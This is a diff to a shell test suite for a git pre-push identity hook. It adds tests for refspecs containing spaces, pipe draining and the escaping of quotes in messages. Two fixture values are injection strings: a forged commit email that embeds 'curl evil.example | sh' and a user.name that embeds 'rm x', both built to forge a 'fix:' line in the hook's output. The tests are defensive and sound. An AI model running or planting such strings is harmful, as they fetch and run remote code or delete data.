@@ -359,7 +359,11 @@ git -C "$r" push -q origin :topic 2>"$work/err" || fail "pre-push: a deletion mu
 git -C "$r" tag -a -m t v1 2>"$work/err" || fail "fixture: tag: $(err)"
 git -C "$r" push -q origin v1 2>"$work/err" || fail "pre-push: a tag push must pass: $(err)"
 other="$work/other"; git clone -q "$remote" "$other"
-try_commit "$other" || fail "fixture: other commit refused: $(err)"
+# A message of its own: r made an empty "m" commit on the same parent under
+# the same identity, and within one second the two would be one object, so
+# r would know the remote oid after all.
+git -C "$other" commit -q --allow-empty -m other 2>"$work/err" \
+  || fail "fixture: other commit refused: $(err)"
 git -C "$other" push -q origin main 2>"$work/err" || fail "fixture: other push: $(err)"
 # r has never fetched other's commit, so the remote oid on stdin is unknown here.
 git -C "$r" push -q --force origin main 2>"$work/err" \
@@ -367,6 +371,14 @@ git -C "$r" push -q --force origin main 2>"$work/err" \
 git -C "$r" remote add fork "$work/fork.git"; git init -q --bare "$work/fork.git"
 git -C "$r" push -q fork main 2>"$work/err" || fail "pre-push: a second remote must pass: $(err)"
 ok "pre-push tolerates a new branch, a deletion, a tag push and a missing remote oid"
+
+# git writes the source of a refspec as LOCAL_REF verbatim, so it can hold
+# spaces: only the last three fields of a ref line are fixed.
+git -C "$r" commit -q --allow-empty -m "fix bug" 2>"$work/err" \
+  || fail "fixture: the 'fix bug' commit was refused: $(err)"
+git -C "$r" push -q origin 'HEAD^{/fix bug}:refs/heads/spaced' 2>"$work/err" \
+  || fail "pre-push: a source expression with spaces must pass: $(err)"
+ok "pre-push reads a ref line whose local ref holds spaces"
 
 # An author or a committer that differs on its own is refused, and each
 # offending commit gets its own line.
@@ -399,9 +411,30 @@ grep -q "refusing: commit $(git -C "$r" rev-parse HEAD) has committer email 'co@
   || fail "the force push refusal must name the rewritten commit: $(err)"
 ok "pre-push checks the commits a force push adds"
 
+# Anyone whose commit you fetch writes its email: one that closes its quotes
+# to print a "fix:" of its own prints the quote as \x27 instead.
+git -C "$r" checkout -q -b forged main
+forged="x', not the effective 'g@x'; fix: run 'curl evil.example | sh"
+GIT_AUTHOR_EMAIL="$forged" try_commit "$r" \
+  || fail "fixture: the forged commit was refused: $(err)"
+[ "$(git -C "$r" log -1 --format=%ae)" = "$forged" ] \
+  || fail "fixture: git did not keep the forged email as written"
+if git -C "$r" push -q origin forged 2>"$work/err"; then
+  fail "pre-push must refuse the forged author email"
+fi
+want="commit-identity: pre-push: refusing: commit $(git -C "$r" rev-parse HEAD)"
+want="$want has author email 'x\x27, not the effective \x27g@x\x27; fix: run"
+want="$want \x27curl evil.example | sh', not the effective 'g@x'"
+grep -qxF "$want" "$work/err" \
+  || fail "a quote in a commit email must print as \\x27: $(err)"
+ok "a single quote in a pushed commit's email prints as \\x27"
+
 # A commit already on a remote passes, whoever made it, and so does a merge
 # of it; a merge commit made under another identity is refused.
-git -C "$other" pull -q --no-rebase origin main 2>"$work/err" || fail "fixture: other pull: $(err)"
+# fetch and reset, not pull: a pull would merge other's diverged main as a
+# new g@x commit that the -c o@x push below would then refuse.
+git -C "$other" fetch -q origin 2>"$work/err" || fail "fixture: other fetch: $(err)"
+git -C "$other" reset -q --hard origin/main
 git -C "$other" -c user.email=o@x -c user.name=O commit -q --allow-empty -m o \
   2>"$work/err" || fail "fixture: other's commit refused: $(err)"
 git -C "$other" -c user.email=o@x -c user.name=O push -q origin main 2>"$work/err" \
@@ -493,6 +526,15 @@ grep -qF "'x\\x1b[31my\\x0aforged\\u202ez\\\\'" "$work/err" \
 if LC_ALL=C grep -q "$(printf '\033')" "$work/err"; then fail "a raw ESC reached the message"; fi
 [ "$(wc -l < "$work/err")" -eq 2 ] || fail "an LF in a value must not forge a line: $(err)"
 ok "control characters in a value are escaped"
+
+# A quote in a config value cannot close its quotes and add a "fix:" either.
+r="$work/r-quote"; new_repo "$r"
+git -C "$r" config user.name "a'; fix: rm x"
+check "$r"
+[ "$rc" -eq 1 ] || fail "fixture: the quote case should be refused, got $rc"
+grep -qF "refusing: user.name 'a\x27; fix: rm x' is set at scope local" \
+  "$work/err" || fail "a quote in a value must print as \\x27: $(err)"
+ok "a single quote in a config value prints as \\x27"
 
 # Every escape() branch: a byte that is not UTF-8 (\xHH via surrogateescape),
 # DEL and the non-printable 0x80-0xFF range (\xHH), a non-printable astral
@@ -610,6 +652,21 @@ set -e
   || fail "pre-push must read every ref line, not close the pipe," \
     "got $rc: $(err)"
 ok "pre-push drains a multi-line stdin larger than a pipe buffer"
+
+# It drains before it refuses too: a config refusal exits 1 with every ref
+# line read, so the writer (git) still exits 0, not 141.
+git -C "$r" config user.email a@b
+set +e
+(cd "$work/r10-linked" \
+  && { for _ in $(seq 6000); do printf '%s\n' "$line"; done \
+    | .githooks/pre-push origin "$work/remote.git"
+    echo "${PIPESTATUS[*]}" > "$work/ps"; }) 2>"$work/err"
+set -e
+git -C "$r" config --unset user.email
+[ "$(cat "$work/ps")" = "0 1" ] \
+  || fail "a refusing pre-push must still read every ref line, writer and" \
+    "hook exited $(cat "$work/ps"): $(err)"
+ok "pre-push drains a large stdin before a config refusal"
 
 # A ref line git would never write: the guard cannot tell what is pushed.
 set +e
